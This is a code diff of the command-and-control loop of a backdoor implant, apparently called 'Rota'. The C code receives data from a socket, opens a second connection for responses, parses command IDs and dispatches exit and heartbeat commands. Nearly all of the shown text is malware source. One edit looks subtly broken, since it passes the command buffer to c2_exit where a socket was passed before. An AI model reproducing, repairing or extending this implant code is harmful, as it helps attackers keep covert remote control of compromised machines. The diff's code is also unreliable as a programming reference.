@@ -19,6 +19,14 @@
 
 void c2_loop() {
 
+        // receive
+        int n = 0;
+        int len = 0;
+        int maxlen = 65536;
+        char buffer[maxlen];
+    char *cmd_id = NULL;
+    int payload_length;
+
     int sleepy_time = 3; // default C2 sleep time
     int sock;
     int sock2;
@@ -65,23 +73,19 @@ void c2_loop() {
     #ifdef DEBUG
         printf("\n(%d) In c2 loop...\n", getpid());
     #endif
-        // receive
-        int n = 0;
-        int len = 0;
-        int maxlen = 65536;
-        char buffer[maxlen];
-        char *cmd_id = NULL;
-        int payload_length;
 
         memset(buffer, 0, maxlen);
 
 
+// get all data from the sending buffers
     while ((n = recv(sock, buffer, maxlen, 0)) > 0) {
-
+        // checkin packet has been sent, close sockets.
         close(sock);
         shutdown(sock, 2);
+        maxlen -= n;
+        len += n;
 
-        // create new socket to send response
+        // create new socket to send response based on parsed data.
         if ((sock2 = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
             fprintf(stderr, "could not create socket\n");
             sleep(sleepy_time);
@@ -93,9 +97,6 @@ void c2_loop() {
             sleep(sleepy_time);
             c2_loop();
         }
-
-        maxlen -= n;
-        len += n;
 
         cmd_id = parse_c2_cmdid(buffer);
         if (!cmd_id) {
@@ -115,7 +116,7 @@ void c2_loop() {
             #ifdef DEBUG
             printf("[+] Rota C2 Run exiting!\n");
             #endif
-            c2_exit(sock, sock2);
+            c2_exit(cmd_id, sock2);
         }
         else if (memcmp(&rota_c2_heartbeat, cmd_id, 4) == 0) {
             c2_heartbeat(cmd_id, sock);
@@ -290,6 +291,7 @@ void c2_loop() {
         close(sock);
         close(sock2);
     }
+
     shutdown(sock, 2);
     shutdown(sock2, 2);
     close(sock);
